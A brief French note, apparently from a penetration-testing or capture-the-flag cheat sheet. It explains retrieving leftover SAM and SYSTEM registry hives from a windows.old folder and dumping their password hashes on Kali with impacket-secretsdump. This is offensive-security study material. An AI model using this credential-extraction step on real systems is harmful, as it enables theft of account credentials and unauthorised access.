Si ce dossier existe, aller dans le dossier :c:\windows.old\windows\System32\
si on trouve les fichiers SAM et SYSTEM, on les récupére sur Kali puis on execute :
```
 impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL 
```